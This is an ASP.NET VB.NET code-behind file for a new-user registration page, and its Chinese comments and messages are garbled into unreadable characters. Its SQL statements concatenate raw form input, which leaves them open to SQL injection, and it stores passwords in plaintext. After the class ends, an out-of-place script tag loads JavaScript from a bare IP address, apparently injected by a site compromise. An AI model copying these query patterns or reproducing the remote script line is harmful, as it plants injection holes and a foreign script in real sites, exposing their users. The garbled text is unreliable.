Imports System.Data
Imports System.Data.SqlClient

Public Class newcustomer
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents lblName As System.Web.UI.WebControls.Label
    Protected WithEvents txtName As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblPwd As System.Web.UI.WebControls.Label
    Protected WithEvents txtPwd As System.Web.UI.WebControls.TextBox
    Protected WithEvents lblConfirm As System.Web.UI.WebControls.Label
    Protected WithEvents txtConfirm As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnAdd As System.Web.UI.WebControls.Button
    Protected WithEvents btnCancel As System.Web.UI.WebControls.Button
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents txtNameRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtPwdRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents txtConfirmRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents lblAccPri As System.Web.UI.WebControls.Label
    Protected WithEvents txtAccPri As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtAccPriRegularExpressionValidator As System.Web.UI.WebControls.RegularExpressionValidator
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite
        If Session("UserName") = "" Then
            Me.lblHint.Text = "����û��¼�����ȵ�¼"
        Else
            Me.lblHint.Text = "���ã� " + Session("UserName")
        End If
    End Sub

    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        Me.txtName.Text = ""
        Me.txtAccPri.Text = ""
    End Sub

    Private Sub btnAdd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAdd.Click
        If (Me.txtName.Text = "" Or Me.txtPwd.Text = "" Or Me.txtConfirm.Text = "" Or Me.txtAccPri.Text = "") Then
            Me.lblWarning.Text = "���ѣ��������ȫ��ע����Ϣ"
            Me.lblWarning.Visible = True
            Exit Sub
        End If
        If (Me.txtPwd.Text <> Me.txtConfirm.Text) Then
            Me.lblWarning.Text = "���ѣ������������벻һ��������������"
            Me.lblWarning.Visible = True
            Exit Sub
        End If

        Me.lblWarning.Visible = False
        Dim mySqlConn As SqlConnection
        mySqlConn = New SqlConnection(Me.Application("DataBase"))
        Dim strSql As String
        Dim sqlReader As SqlDataReader = Nothing
        strSql = "select * from userTable where UserId='" + Me.txtName.Text.Trim() + "'"
        Dim mySqlComm As SqlCommand
        mySqlComm = New SqlCommand(strSql, mySqlConn)
        Try
            mySqlConn.Open()
            sqlReader = mySqlComm.ExecuteReader()

            If (sqlReader.Read()) Then
                Me.lblWarning.Text = "���棺���û����Ѵ��ڣ��������µ��û���"
                lblWarning.Visible = True
            Else
                strSql = "Insert into userTable values('" + Me.txtName.Text.Trim() + "', '" + Me.txtPwd.Text.Trim() + "', '" + Me.txtAccPri.Text.Trim() + "')"
                mySqlConn.Close()
                mySqlComm.CommandText = strSql
                mySqlConn.Open()
                If (mySqlComm.ExecuteNonQuery() > 0) Then
                    Me.lblWarning.Text = "��ϲ������û�" + Me.txtName.Text.Trim() + "�ɹ�"
                    Me.lblWarning.Visible = True
                Else
                    Me.lblWarning.Text = "���棺����ĳ��ԭ������û�ʧ�ܣ�������û��Ȩ��"
                    Me.lblWarning.Visible = True
                    txtName.Text = ""
                End If
            End If
            sqlReader.Close()
            mySqlConn.Close()
        Catch ex As SqlException
            If sqlReader.IsClosed = False Then
                sqlReader.Close()
                mySqlConn.Close()
            End If
            Response.Redirect("error.htm") ' ������ʾ
        Finally
        End Try
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
